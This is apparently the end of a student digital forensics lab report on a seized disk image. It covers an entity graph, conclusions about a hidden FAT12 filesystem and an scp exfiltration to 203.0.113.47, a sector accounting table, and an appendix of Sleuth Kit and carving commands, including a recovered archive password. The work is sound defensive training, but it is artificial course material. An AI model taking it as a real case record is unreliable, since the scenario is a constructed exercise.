Cross-referencing names and identifiers across all recovered files yields a coherent entity graph:

**"J. Doe"** appears as manager in `team_contacts.xlsx` and as an attendee in `meeting_notes.docx`. Given that the drive was seized from a departing employee, J. Doe is the most likely identity of the suspect.

**"S. Chen (Meridian FG)"** is an attendee in `meeting_notes.docx` and the apparent client contact at Meridian Financial Group — the same entity named in `project_alpha.txt` as the party to a $2.4 million contract. The meeting notes' instruction to "confirm secure drop location with S. Chen" suggests S. Chen is the intended recipient of the exfiltrated data.

**"M. Patel"** manages Sales in `team_contacts.xlsx` and attended the meeting in `meeting_notes.docx`. Their role in the exfiltration, if any, cannot be determined from this evidence alone.

**"Project Alpha"** is referenced in three separate files across two concealment layers: `project_alpha.txt` (encrypted FAT12 archive), `meeting_notes.docx` (NTFS surface), and `Q3_review.docx` (NTFS surface). This repetition is not coincidence — it establishes that the NTFS surface files were fabricated to reference the same project whose confidential details were being exfiltrated.

**`203.0.113.47`** is the exfiltration destination. The `.bash_history` records an `scp` transfer to `deploy@203.0.113.47:/var/drop/`. The meeting notes' reference to a "secure drop location" corroborates that this infrastructure was pre-arranged.

### 9.6  What the Evidence Supports — and What It Does Not

The evidence on this drive supports the following conclusions to a high degree of confidence:

The drive was manufactured as a single artifact on March 16, 2026. A FAT12 filesystem was hidden in the pre-partition gap, containing tools, cracked credentials, a complete command history, and an encrypted archive of stolen data. The NTFS surface was populated by script with files designed to appear routine. Multiple anti-forensic techniques were applied. The encrypted archive contains confidential client data, employee PII, and infrastructure credentials. The command history records transmission of this archive to an external server.

The evidence does **not** establish who physically operated the system that created the drive. The suspect is "the departing employee from whom the drive was seized," but the drive itself contains no login records, no user account names (beyond `deploy`, the remote username), and no system identification beyond the tools used. The `.bash_history` records commands but not who typed them. Attribution to a specific individual must rest on the chain of custody surrounding the drive's seizure, not on the drive's contents alone.

Similarly, the evidence does not establish whether the data at `203.0.113.47` has been accessed, distributed, or remains intact. The `scp` command confirms transmission occurred, but the current state of the destination is beyond the scope of this examination.

### 9.7  Disk Accounting Summary

Every sector of the 524,288-sector disk image has been examined and accounted for:

| Region | Sectors | Contents | Status |
|--------|---------|----------|--------|
| MBR | 0 | Standard bootstrap, one partition entry, disk signature `0xC634B45D` | Fully examined (§2.2–§2.3) |
| Pre-partition gap | 1–2,047 | Hidden FAT12 filesystem: 4 files, no deleted files, unallocated space null-filled | Fully examined (§3) |
| NTFS partition | 2,048–524,287 | 76 MFT entries: 9 user files + 1 deleted, 8 formatting stubs, system metadata. 241 MB unallocated space null-filled. No change journal. | Fully examined (§4–§6) |
| Trailing space | — | None. Partition extends to final sector. | Verified (§2.2) |

No sector of the disk is unexamined. No evidence was found in any region that is not documented in this report.

---

## Appendix A — Command Reference

All commands executed during this examination, organized by analytical phase. All commands were run on Ubuntu 24 LTS. The disk image `exhibit-a.dd` and all relative paths assume the working directory is the repository root (`csci4623s26-lab1/`).

### A.1  Image Integrity and Disk Layout (§2)

```bash
# Compute baseline hashes
sha256sum exhibit-a.dd
md5sum exhibit-a.dd

# Parse partition table
mmls exhibit-a.dd

# Examine MBR boot code (first 512 bytes)
xxd -l 512 exhibit-a.dd
```

### A.2  Hidden FAT12 Discovery and Extraction (§3)

```bash
# Extract pre-partition gap (sectors 1–2047) as standalone image
dd if=exhibit-a.dd bs=512 skip=1 count=2047 of=evidence/fat12/pre_partition.bin

# Identify filesystem type
file evidence/fat12/pre_partition.bin

# Parse FAT12 filesystem metadata
fsstat evidence/fat12/pre_partition.bin

# List files in FAT12
fls evidence/fat12/pre_partition.bin

# Extract each file by inode
icat evidence/fat12/pre_partition.bin 3 > evidence/fat12/tools.txt
icat evidence/fat12/pre_partition.bin 4 > evidence/fat12/notes.txt
icat evidence/fat12/pre_partition.bin 6 > evidence/fat12/bash_history.txt
icat evidence/fat12/pre_partition.bin 7 > evidence/fat12/secrets.zip

# Decrypt the ZIP archive using password from bash_history
unzip -P 'dusty.lantern.fading.winter.copper.hollow' evidence/fat12/secrets.zip -d evidence/secrets/

# Check for deleted files in FAT12
fls -d evidence/fat12/pre_partition.bin

# Extract and examine FAT12 unallocated space
blkls evidence/fat12/pre_partition.bin > /tmp/fat12_unalloc.bin
strings /tmp/fat12_unalloc.bin | head -50
```

### A.3  NTFS Characterization and File Extraction (§4–§5)

```bash
# Parse NTFS filesystem metadata
fsstat -o 2048 exhibit-a.dd

# List all files recursively with full paths
fls -o 2048 -r -p exhibit-a.dd > logs/fls_full.txt

# List deleted files
fls -o 2048 -r -d exhibit-a.dd > logs/deleted_files.txt

# Extract each user file by MFT entry number
icat -o 2048 exhibit-a.dd 67 > evidence/ntfs/team_contacts.xlsx
icat -o 2048 exhibit-a.dd 68 > evidence/ntfs/Q3_review.docx
icat -o 2048 exhibit-a.dd 69 > evidence/ntfs/putty.exe
icat -o 2048 exhibit-a.dd 70 > evidence/ntfs/WinSCP-5.21.8-Setup.exe
icat -o 2048 exhibit-a.dd 71 > evidence/ntfs/whiteboard_20240912.jpg
icat -o 2048 exhibit-a.dd 72 > evidence/ntfs/office_floorplan.png
icat -o 2048 exhibit-a.dd 73 > evidence/ntfs/quarterly_report_actual.zip
icat -o 2048 exhibit-a.dd 74 > evidence/ntfs/meeting_notes.docx
icat -o 2048 exhibit-a.dd 75-128-2 > evidence/ntfs/readme_deleted.txt

# Verify file types by magic bytes
file evidence/ntfs/*

# Examine istat for each user file (MFT entries 67–75)
for i in $(seq 67 75); do
    echo "======== INODE $i ========"
    istat -o 2048 exhibit-a.dd $i
done > logs/istat_all.txt

# Check for Alternate Data Streams
fls -o 2048 -r -p exhibit-a.dd | grep ':'

# Examine OOXML metadata (quarterly_report.pdf)
cp evidence/ntfs/quarterly_report_actual.zip /tmp/qr.zip
cd /tmp && unzip -o qr.zip -d qr_contents/ && cd -
cat /tmp/qr_contents/docProps/core.xml

# Examine OOXML content (meeting_notes.docx, Q3_review.docx)
cp evidence/ntfs/meeting_notes.docx /tmp/mn.zip
cd /tmp && unzip -o mn.zip -d mn_contents/ && cd -
cat /tmp/mn_contents/docProps/core.xml
cat /tmp/mn_contents/word/document.xml

cp evidence/ntfs/Q3_review.docx /tmp/q3.zip
cd /tmp && unzip -o q3.zip -d q3_contents/ && cd -
cat /tmp/q3_contents/docProps/core.xml
cat /tmp/q3_contents/word/document.xml

# Examine XLSX content (team_contacts.xlsx)
cp evidence/ntfs/team_contacts.xlsx /tmp/tc.zip
cd /tmp && unzip -o tc.zip -d tc_contents/ && cd -
cat /tmp/tc_contents/docProps/core.xml
cat /tmp/tc_contents/xl/worksheets/sheet1.xml

# Examine image metadata
exiftool evidence/ntfs/whiteboard_20240912.jpg
exiftool evidence/ntfs/office_floorplan.png

# Hash all extracted evidence files
find evidence/ -type f -exec sha256sum {} \; | sort > logs/hash_manifest.txt
```

### A.4  NTFS Deep Analysis (§6)

```bash
# Examine orphan MFT entries (16–23)
for i in $(seq 16 23); do
    echo "======== INODE $i ========"
    istat -o 2048 exhibit-a.dd $i
done > logs/istat_orphans.txt

# Attempt recovery of orphan entries
for i in $(seq 16 23); do
    icat -o 2048 exhibit-a.dd $i > evidence/ntfs/orphans/orphan_$i.dat
done

# Extract raw MFT
icat -o 2048 exhibit-a.dd 0 > evidence/ntfs/mft.raw

# Parse MFT with analyzeMFT
analyzemft -f evidence/ntfs/mft.raw -o evidence/ntfs/mft.csv

# Check for $UsnJrnl
fls -o 2048 exhibit-a.dd 11

# Extract and examine NTFS unallocated space
blkls -o 2048 exhibit-a.dd > evidence/ntfs/unallocated.bin
strings evidence/ntfs/unallocated.bin | wc -l
```

### A.5  Stream-Level Analysis (§7)

```bash
# Run bulk_extractor on full disk image
bulk_extractor -o be_output exhibit-a.dd 2>&1 | tee logs/bulk_extractor_run.txt

# Survey output files
ls -lhS be_output/

# Examine key feature files
cat be_output/email.txt
cat be_output/domain.txt
cat be_output/url.txt
cat be_output/exif.txt

# Examine histograms
cat be_output/email_histogram.txt
cat be_output/domain_histogram.txt

# Copy relevant outputs to logs/
cp be_output/report.xml logs/be_report.xml
cp be_output/email.txt be_output/domain.txt be_output/url.txt logs/
cp be_output/exif.txt be_output/email_histogram.txt be_output/domain_histogram.txt logs/

# File carving cross-check with foremost
foremost -t all -i exhibit-a.dd -o /tmp/foremost_output
cat /tmp/foremost_output/audit.txt

# Executable hash verification
sha256sum evidence/ntfs/putty.exe
sha256sum evidence/ntfs/WinSCP-5.21.8-Setup.exe
```

### A.6  Final Verification (§8)

```bash
# Re-verify image integrity
sha256sum exhibit-a.dd
md5sum exhibit-a.dd

# Generate final evidence hash manifest
find evidence/ -type f ! -path "*/orphans/*" ! -name "unallocated.bin" \
    -exec sha256sum {} \; | sort > logs/final_hash_manifest.txt
```